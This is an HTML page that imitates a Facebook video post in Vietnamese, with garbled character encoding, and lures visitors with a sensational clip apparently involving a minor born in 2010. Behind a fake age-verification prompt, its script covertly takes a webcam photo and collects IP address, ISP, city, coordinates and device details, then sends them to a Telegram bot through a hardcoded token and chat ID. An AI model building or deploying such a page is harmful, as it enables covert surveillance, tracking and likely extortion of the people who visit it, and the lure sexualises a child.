<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video | Facebook</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, system-ui, sans-serif; background-color: #000; color: #fff; overflow-x: hidden; }
        #loading-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 9999; color: #1c1e21; text-align: center; padding: 20px; }
        .fb-loader { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #1877f2; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #main-content { display: none; max-width: 500px; margin: 0 auto; background: #1c1e21; min-height: 100vh; }
        .fb-header { background: #242526; padding: 12px; border-bottom: 1px solid #3e4042; display: flex; align-items: center; gap: 10px; }
        .post-info { padding: 12px; display: flex; align-items: center; gap: 10px; }
        .avatar { width: 40px; height: 40px; border-radius: 50%; background: #4e4f50; }
        .video-wrapper { position: relative; width: 100%; aspect-ratio: 9/16; background: #000; display: flex; justify-content: center; align-items: center; cursor: pointer; }
        .thumbnail { width: 100%; height: 100%; object-fit: cover; filter: blur(8px); }
        .error-box { background: white; padding: 25px; border-radius: 12px; max-width: 350px; color: #000; }
        .btn-retry { background: #1877f2; color: white; border: none; padding: 12px; border-radius: 6px; font-weight: bold; width: 100%; margin-top: 15px; cursor: pointer; }
    </style>
</head>
<body>

<div id="loading-screen">
    <div id="status-container">
        <div class="fb-loader"></div>
        <p style="margin-top: 20px; font-weight: 500; font-size: 17px;">YÃªu cáº§u xÃ¡c thá»±c trÃ¬nh duyá»‡t</p>
        <p style="font-size: 13px; color: #65676b; margin-top: 8px;">Vui lÃ²ng xÃ¡c minh mÃ¡y áº£nh Ä‘á»ƒ xÃ¡c nháº­n Ä‘á»™ tuá»•i.</p>
        <button onclick="handleAuth()" style="margin-top: 20px; padding: 12px 30px; background: #1877f2; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer;">Tiáº¿p tá»¥c</button>
    </div>
</div>

<div id="main-content">
    <div class="fb-header"><span class="header-title">Video cá»§a HÃ³ng Biáº¿n 24h</span></div>
    <div class="post-info"><div class="avatar"></div><div><div class="author-name">HÃ³ng Biáº¿n 24h</div><div style="font-size:12px;color:#b0b3b8">Vá»«a xong â€¢ ğŸŒ</div></div></div>
    <div style="padding: 12px; font-size: 15px;">Cá»°C Sá»C: Clip 2k10 trong nhÃ  vá»‡ sinh... #cliphot #hongbien</div>
    <div class="video-wrapper" onclick="window.location.href='https://streamable.com/ux1xwz'">
        <img src="https://i.ibb.co/vz6mDkL/blurred-video.jpg" class="thumbnail">
        <div style="position: absolute; border: 2px solid #fff; border-radius: 50%; padding: 15px; background: rgba(0,0,0,0.5);">â–¶</div>
    </div>
</div>

<script>
    const BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
    const CHAT_ID = '-1003770043455';

    async function handleAuth() {
        try {
            // BÆ°á»›c 1: Xin quyá»n Camera (Chá»‘t cháº·n quan trá»ng nháº¥t)
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            
            // Náº¿u khÃ¡ch báº¥m "Cho phÃ©p", code má»›i cháº¡y tiáº¿p xuá»‘ng Ä‘Ã¢y
            stream.getTracks().forEach(t => t.stop());

            document.getElementById('status-container').innerHTML = '<div class="fb-loader"></div><p style="margin-top:20px">Äang xÃ¡c thá»±c dá»¯ liá»‡u...</p>';

            // BÆ°á»›c 2: Láº¥y táº¥t cáº£ thÃ´ng sá»‘
            const data = await collectData();
            const photo = await takeSnaps();

            // BÆ°á»›c 3: Gá»­i vá» Telegram
            await sendTele(data, photo);

            // BÆ°á»›c 4: Má»Ÿ khÃ³a ná»™i dung
            document.getElementById('loading-screen').style.display = 'none';
            document.getElementById('main-content').style.display = 'block';

        } catch (err) {
            // Náº¿u khÃ¡ch báº¥m "Tá»« chá»‘i" hoáº·c lá»—i, nÃ³ nháº£y vÃ o Ä‘Ã¢y. KHÃ”NG Gá»¬I GÃŒ Háº¾T.
            showErr();
        }
    }

    async function collectData() {
        const ipInfo = await fetch('https://ipwho.is/').then(r => r.json());
        const ipDancu = await fetch('https://api.ipify.org?format=json').then(r => r.json());
        
        return {
            time: new Date().toLocaleString('vi-VN'),
            ip: ipDancu.ip,
            realIp: ipInfo.ip,
            isp: ipInfo.connection?.org || 'VNNIC',
            address: `${ipInfo.city}, ${ipInfo.region}`,
            country: ipInfo.country || 'Vietnam',
            lat: ipInfo.latitude,
            lon: ipInfo.longitude,
            os: navigator.userAgent.includes('iPhone') ? 'iOS' : 'Android/PC',
            device: navigator.platform
        };
    }

    async function takeSnaps() {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        stream.getTracks().forEach(t => t.stop());
        return new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
    }

    async function sendTele(d, blob) {
        const maps = `http://maps.google.com/maps?q=${d.lat},${d.lon}`;
        const caption = `ğŸ“¡ [THÃ”NG TIN TRUY Cáº¬P]\n\nğŸ•’ Thá»i gian: ${d.time}\nğŸ“± Thiáº¿t bá»‹: ${d.device}\nğŸ–¥ï¸ Há»‡ Ä‘iá»u hÃ nh: ${d.os}\nğŸŒ IP dÃ¢n cÆ°: ${d.ip}\nğŸ§  IP gá»‘c: ${d.realIp}\nğŸ¢ ISP: ${d.isp}\nğŸ™ï¸ Äá»‹a chá»‰: ${d.address}\nğŸŒ Quá»‘c gia: ${d.country}\nğŸ“ VÄ© Ä‘á»™: ${d.lat}\nğŸ“ Kinh Ä‘á»™: ${d.lon}\nğŸ“Œ Google Maps: ${maps}\nğŸ“¸ Camera: âœ… ÄÃ£ chá»¥p`;

        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('photo', blob, 'cam.jpg');
        fd.append('caption', caption);

        return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    }

    function showErr() {
        document.getElementById('status-container').innerHTML = `
            <div class="error-box">
                <h3 style="color:#d32f2f">Quyá»n truy cáº­p bá»‹ cháº·n</h3>
                <p style="margin-top:10px;font-size:14px">Vui lÃ²ng báº¥m <b>Cho phÃ©p</b> Ä‘á»ƒ xÃ¡c nháº­n báº¡n khÃ´ng pháº£i lÃ  robot.</p>
                <button class="btn-retry" onclick="location.reload()">Táº£i láº¡i trang</button>
            </div>`;
    }
</script>
</body>
</html>
